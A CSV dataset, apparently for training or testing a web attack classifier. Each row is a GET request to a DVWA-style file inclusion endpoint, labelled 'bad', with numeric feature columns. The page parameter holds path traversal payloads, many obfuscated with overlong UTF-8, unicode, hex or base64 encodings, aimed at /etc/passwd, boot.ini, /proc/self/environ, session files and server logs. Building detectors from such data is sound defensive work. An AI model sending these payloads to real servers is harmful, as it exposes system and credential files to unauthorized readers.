method,path,body,sign1,sign2,sign3,sign4,sign5,sign6,badwords,class
GET,/vulnerabilities/fi/?page=À.À./À.À./À.À./etc/issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%5%c..%5%c..%5%c..%5%c..%5%c..%5%cwindows%5%csystem32%5%cdrivers%5%cetc%5%chosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,2,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/chrootUsers,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.Á%pc?.Á%pc?.Á%pc?.Á%pc?.Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..À¯..À¯..À¯..À¯etcÀ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®Á¯ð€€®ð€€®Á¯windowsÁ¯system32Á¯driversÁ¯etcÁ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?Á%pc.?Á%pc.?Á%pc.?Á%pc.?Á%pc.?Á%pcetcÁ%pcissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eà€¯etcà€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®Á¯À®À®Á¯À®À®Á¯À®À®Á¯À®À®Á¯À®À®Á¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%2f\..%2fetc%2fissue,,2,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vð€€®ð€€®À%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÀ%9v%c0%ae%c0%aeÀ%9vetcÀ%9vpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..\/etc\/issue,,0,1,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=À®À®%2fÀ®À®%2fÀ®À®%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../boot.ini;index.htm,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=...\.\,,0,1,1,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%bg%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®ø€€€¯etcø€€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.%bg%qfetc%bg%qfissue,,1,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Á¯ø€€€®ø€€€®Á¯ø€€€®ø€€€®Á¯ø€€€®ø€€€®Á¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=C:/program,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=./.././.././../boot.ini,,3,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%u2215?.%u2215?.%u2215?.%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..0x2f..0x2f..0x2f..0x2fetc0x2fissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®%bg%qfø€€€®ø€€€®%bg%qfø€€€®ø€€€®%bg%qfø€€€®ø€€€®%bg%qfø€€€®ø€€€®%bg%qfø€€€®ø€€€®%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=?.%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.../.ÁœwindowsÁœsystem32ÁœdriversÁœetcÁœhosts,,1,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9c0x2e0x2e%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÁ0x2e0x2eÁ0x2e0x2eÁetcÁpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..../%c0%af..../%c0%af..../%c0%afetc%c0%afpasswd,,3,0,0,0,0,3,2,bad
GET,/vulnerabilities/fi/?page=?.%uEFC8?.%uEFC8windows%uEFC8system32%uEFC8drivers%uEFC8etc%uEFC8hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..À¯..À¯..À¯windowsÀ¯system32À¯driversÀ¯etcÀ¯hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnÁetcÁissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,1,0,0,0,0,1,2,bad
GET,/vulnerabilities/fi/?page=/.\/\.\.\/\.\,,0,0,1,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2e%2eÀ\%2e%2eÀ\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%u2216etc%u2216issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/etc/hostname.pcn0,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn%uF025%ÀnÀn%uF025%ÀnÀn%uF025%ÀnÀn%uF025%ÀnÀn%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?À\etcÀ\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2eÁ¯0x2e0x2eÁ¯0x2e0x2eÁ¯0x2e0x2eÁ¯0x2e0x2eÁ¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/httpd/conf.d/httpd.conf,,0,0,0,0,0,0,5,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%uF025ÀîÀî%uF025ÀîÀî%uF025ÀîÀî%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eÀ%qf%2e%2eÀ%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/À.À./À.À./À.À./À.À./À.À./,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=??À/??À/??À/??À/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/var/www/mgr/logs/access.log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==,,0,0,0,0,0,0,12,bad
GET,/vulnerabilities/fi/?page=..../À/..../À/..../À/..../À/windowsÀ/system32À/driversÀ/etcÀ/hosts,,4,0,0,0,0,4,2,bad
GET,/vulnerabilities/fi/?page=.?%u2216.?%u2216.?%u2216.?%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..À\..À\etcÀ\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eð€€¯%2%e%2%eð€€¯%2%e%2%eð€€¯%2%e%2%eð€€¯etcð€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..%bg%qf..%bg%qf..%bg%qfetc%bg%qfissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.%5%cÀ.À.%5%cÀ.À.%5%cÀ.À.%5%cwindows%5%csystem32%5%cdrivers%5%cetc%5%chosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/0x2e0x2e/0x2e0x2e/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................../../../../../etc/issue,,5,0,0,0,0,1,1,bad
GET,/vulnerabilities/fi/?page=??%uF025??%uF025??%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.?À/.?À/.?À/windowsÀ/system32À/driversÀ/etcÀ/hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.0x2fetc0x2fpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/0x2e0x2e\0x2e0x2e\boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÁ%uff0e%uff0eÁ%uff0e%uff0eÁ%uff0e%uff0eÁ%uff0e%uff0eÁ%uff0e%uff0eÁboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%2%f\..%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=.../.%c1%9c.../.%c1%9cboot.ini,,2,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/usr/local/app/php5/lib/php.ini,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=%2e%2eð€€¯%2e%2eð€€¯%2e%2eð€€¯etcð€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%5c.../.%5c.../.%5c.../.%5cetc%5cissue,,4,0,3,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?Á%8s.?Á%8s.?Á%8s.?Á%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%uF025%c0%ae%c0%ae%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=....\....\....\....\{FILE},,0,4,3,3,4,0,0,bad
GET,/vulnerabilities/fi/?page=/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215%2e%2e%u2215etc%u2215passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%2%fetc%2%fissue,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216ÀîÀî%u2216boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=C:/logs/error.log,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=C:\MySQL\my.ini,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/..%u2216..%u2216{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=à€®à€®%uF025à€®à€®%uF025à€®à€®%uF025à€®à€®%uF025à€®à€®%uF025à€®à€®%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/lib/php5/session/sess_<sessid>,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/usr/local/apache/error_log,,0,0,0,0,0,0,3,bad
GET,/vulnerabilities/fi/?page=.?Á.?Á.?Á.?Á.?Á.?ÁetcÁpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..Á\..ÁwindowsÁsystem32ÁdriversÁetcÁhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=?.À%qf?.À%qf?.À%qf?.À%qfetcÀ%qfpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/etc/hostname.ge3,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%ÀnÀnð€€¯%ÀnÀnð€€¯etcð€€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®\ø€€€®ø€€€®\ø€€€®ø€€€®\ø€€€®ø€€€®\ø€€€®ø€€€®\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=À.À.%5%cboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%bg%qf0x2e0x2e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../opt/xampp/logs/access_log,,15,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Á¯etcÁ¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=..\..\etc\issue,,0,2,1,1,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/..%5c..%5c..%5c,,0,3,2,1,0,0,0,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%ae%2%fboot.ini,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows\system32\drivers\etc\hosts,,0,4,3,2,0,0,2,bad
GET,/vulnerabilities/fi/?page=ÀþÀþà€¯ÀþÀþà€¯ÀþÀþà€¯ÀþÀþà€¯ÀþÀþà€¯etcà€¯passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯%2%e%2%eø€€€¯etcø€€€¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/..\/..\/..\/..\{FILE},,0,4,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn%c0%af%ÀnÀn%c0%af%ÀnÀn%c0%af%ÀnÀn%c0%af%ÀnÀn%c0%af%ÀnÀn%c0%afetc%c0%afissue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\..%uF025\..%uF025\..%uF025\..%uF025\..%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..À%qf..À%qf..À%qfboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8sø€€€®ø€€€®Á%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=..../Á%8s..../Á%8s..../Á%8s..../Á%8sboot.ini,,4,0,0,0,0,4,1,bad
GET,/vulnerabilities/fi/?page=À.À.%uF025À.À.%uF025À.À.%uF025À.À.%uF025À.À.%uF025À.À.%uF025etc%uF025passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=.\..\.\..\{FILE},,0,2,2,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=%c0%ae%c0%aeÁ%pc%c0%ae%c0%aeÁ%pc%c0%ae%c0%aeÁ%pcboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%ÀnÀn\%ÀnÀn\%ÀnÀn\%ÀnÀn\%ÀnÀn\windows\system32\drivers\etc\hosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025%2e%2e%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE},,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..///..///..///..///..///..///etc///issue,,6,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%2%fÀþÀþ%2%fÀþÀþ%2%fÀþÀþ%2%fÀþÀþ%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%2fetc%2fissue,,1,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2eÀ\%2e%2eÀ\%2e%2eÀ\etcÀ\passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=........................................................................../../../../../../{FILE},,6,0,0,0,0,1,0,bad
GET,/vulnerabilities/fi/?page=.../.%bg%qf.../.%bg%qf.../.%bg%qf.../.%bg%qf.../.%bg%qfetc%bg%qfissue,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®%uF025à€®à€®%uF025boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e%u2215%2e%2e%u2215boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ/ÀþÀþ/ÀþÀþ/ÀþÀþ/ÀþÀþ/boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=proc/self/environ,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=à€®à€®0x5cboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.?ð€€¯.?ð€€¯.?ð€€¯.?ð€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/var/log/auth.log.3.gz,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/etc/sysconfig/iptables,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%2e%2eÁ%8swindowsÁ%8ssystem32Á%8sdriversÁ%8setcÁ%8shosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/var/log/mysql/mysql-bin.log,,0,0,0,0,0,0,4,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../boot.ini,,2,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.À/.../.À/.../.À/.../.À/.../.À/etcÀ/issue,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=0x2e0x2e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=\..%c1%9c\..%c1%9cetc%c1%9cpasswd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA../../etc/issue,,2,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=à€®à€®0x5cà€®à€®0x5cà€®à€®0x5cà€®à€®0x5cà€®à€®0x5cà€®à€®0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8s%uff0e%uff0eÁ%8sboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8%uff0e%uff0e%uEFC8boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþ%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=\Program,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=\..%uF025\..%uF025\..%uF025\..%uF025\..%uF025etc%uF025issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=.../.%5%c.../.%5%c.../.%5%c.../.%5%c.../.%5%cwindows%5%csystem32%5%cdrivers%5%cetc%5%chosts,,5,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\etc\issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀþÀþÁ¯ÀþÀþÁ¯ÀþÀþÁ¯ÀþÀþÁ¯etcÁ¯issue,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f{FILE},,2,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=..ø€€€¯..ø€€€¯..ø€€€¯boot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f,,0,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=../../../../../../../../../../../proc/self/environ,,11,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=À^À^À/À^À^À/À^À^À/À^À^À/À^À^À/À^À^À/etcÀ/passwd,,0,0,0,0,0,0,2,bad
GET,/vulnerabilities/fi/?page=/../../../{FILE},,3,0,0,0,0,0,0,bad
GET,/vulnerabilities/fi/?page=/usr/local/etc/apache2/conf/httpd.conf,,0,0,0,0,0,0,8,bad
GET,/vulnerabilities/fi/?page=??%2%fwindows%2%fsystem32%2%fdrivers%2%fetc%2%fhosts,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=ÀîÀî%c0%afÀîÀî%c0%afÀîÀî%c0%afÀîÀî%c0%afboot.ini,,0,0,0,0,0,0,1,bad
GET,/vulnerabilities/fi/?page=/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../boot.ini,,3,0,0,0,0,0,1,bad
